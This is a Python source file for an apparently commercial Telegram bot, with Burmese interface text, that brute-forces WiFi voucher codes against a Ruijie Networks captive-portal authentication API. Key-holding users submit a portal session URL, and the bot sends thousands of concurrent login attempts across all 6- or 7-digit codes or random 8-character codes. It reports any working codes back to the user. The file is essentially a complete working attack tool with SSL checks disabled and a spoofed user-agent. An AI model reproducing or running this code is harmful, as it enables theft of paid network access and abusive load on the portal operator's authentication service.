import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, concurrent.futures
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

BOT_TOKEN = ''
GITHUB_TOKEN = ''
REPO_OWNER = ""
REPO_NAME = ""
ADMIN_ID = ""
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
_session_pool = {}

session = None
_connector = None
_voucher_sem = None

_start_time = time.monotonic()

SESSION_POOL_LIMIT = 60
SESSION_POOL_SLOTS = 5
CONCURRENCY = 2500
BATCH_SIZE = 5000

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

async def rebuild_session():
    global session, _connector
    if session and not session.closed:
        await session.close()
    if _connector and not _connector.closed:
        await _connector.close()
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=6000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )

async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha
    }
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /key ဖြင့်စတင်ပါ။")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    global approve
    key = str(message.chat.id)
    auth_list, _ = await get_file_content("auth_list.json")
    if key in auth_list:
        valid = check_key_expiration(auth_list[key])
        if valid:
            approve[message.chat.id] = True
            user_data[message.chat.id] = {}
            await bot.reply_to(
                message,
                " Key မှန်ကန်ပါသည်။ /portal ဖြင့် Session URL ထည့်ပါ။"
            )
        else:
            approve[message.chat.id] = False
            await bot.reply_to(
                message,
                " Key Expired ဖြစ်နေပါသည်။"
            )
    else:
        await bot.reply_to(
            message,
            " သင်၏ key ကို registered မလုပ်ရသေးပါ။"
        )

@bot.message_handler(commands=['portal'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "Usage:\n\n/portal your_session_url"
        )
        return
    url = args[1]
    if message.chat.id in user_data:
        await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
        user_data[message.chat.id]['session_url'] = url
        await bot.reply_to(message, "Session URL အားသိမ်းဆည်းပြီးပါပြီ။ /scan ဖြင့် စတင်ပါ။")

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    if chat_id in scan_tasks:
        scan_tasks[chat_id]["total"] = total
        scan_tasks[chat_id]["mode"] = mode
        scan_tasks[chat_id]["start_time"] = scan_start
    
    global _voucher_sem
    effective_concurrency = CONCURRENCY
    _voucher_sem = asyncio.Semaphore(effective_concurrency)

    pending: set = set()
    last_update = time.monotonic()

    async def _check(code):
        async with _voucher_sem:
            return await perform_check(
                session_url, code, chat_id, scan_id, message=message
            )

    async def _flush_progress():
        nonlocal last_update
        now = time.monotonic()
        if now - last_update < 1.0:
            return
        last_update = now
        elapsed = now - scan_start
        speed = (checked / elapsed * 60) if elapsed > 0 else 0
        found = len(success_texts.get(chat_id, []))
        
        if total:
            percent = (checked / total) * 100
            text = (
                f"🔍 **Scanning VOUCHER Codes...**\n\n"
                f"📦 Checked : {checked:,} / {total:,}\n"
                f"📊 Progress : {percent:.2f}%\n"
                f"⚡ Speed : {speed:,.0f} codes/min\n"
                f"✅ Success code hit : {found}"
            )
        else:
            text = (
                f"🔍 **Scanning VOUCHER Codes...**\n\n"
                f"📦 Checked : {checked:,}\n"
                f"⚡ Speed : {speed:,.0f} codes/min\n"
                f"✅ Success code hit : {found}"
            )
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=progress_msg.message_id,
                text=text,
                parse_mode="Markdown"
            )
        except Exception:
            pass

    try:
        for code in code_iter:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                break

            t = asyncio.create_task(_check(code))
            pending.add(t)
            t.add_done_callback(pending.discard)

            if len(pending) >= effective_concurrency:
                done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
                checked += len(done)
                await _flush_progress()

        while pending:
            done, _ = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
            checked += len(done)
            await _flush_progress()

    finally:
        scan_tasks.pop(chat_id, None)

async def perform_check(session_url, code, chat_id, scan_id=None, message=None):
    post_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog/?stage=portal"
    try:
        timeout = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False)) as task_session:
            headers = {
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
            }
            payload = {
                "accessCode": code,
                "apiVersion": 1,
            }
            async with task_session.post(post_url, json=payload, headers=headers) as req:
                response = await req.text()
                if req.status == 200 and ('success' in response or 'logonUrl' in response):
                    if chat_id not in success_texts:
                        success_texts[chat_id] = []
                    
                    success_msg = f"🎫 `{code}`\n   📋 Plan: 1M | ⏳ Time: 0m"
                    success_texts[chat_id].append(success_msg)
                    await bot.send_message(chat_id, f"Success Codes:\n\n{success_msg}", parse_mode="Markdown")
                    return code
                elif req.status == 200 and 'STA' in response:
                    if chat_id not in limited_texts:
                        limited_texts[chat_id] = []
                    limited_msg = f"⚠️ `{code}`"
                    limited_texts[chat_id].append(limited_msg)
    except Exception:
        pass
    return None

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield "".join(random.choice(string.digits) for _ in range(8))
    if mode == "ascii-lower":
        while True:
            yield "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    if mode == "all":
        while True:
            yield "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))
    raise ValueError(f"Unsupported scan mode: {mode}")

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>")
        return
    mode = args[1]
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/portal ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "Scan သည် အလုပ်လုပ်နေဆဲ ဖြစ်ပါသည်။")
        return

    progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode,
            chat_id,
            user_data[chat_id]['session_url'],
            scan_id,
            message=message,
            progress_msg=progress_msg
        )
    )

    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id,
    }

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["task"].cancel()
        scan_tasks.pop(chat_id, None)
        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။")
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် မည်သည့် Scan မျှမရှိပါ။")

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        return True
    except:
        return False

async def main():
    await rebuild_session()
    asyncio.create_task(web_server())
    await bot.infinity_polling()

if __name__ == '__main__':
    asyncio.run(main())
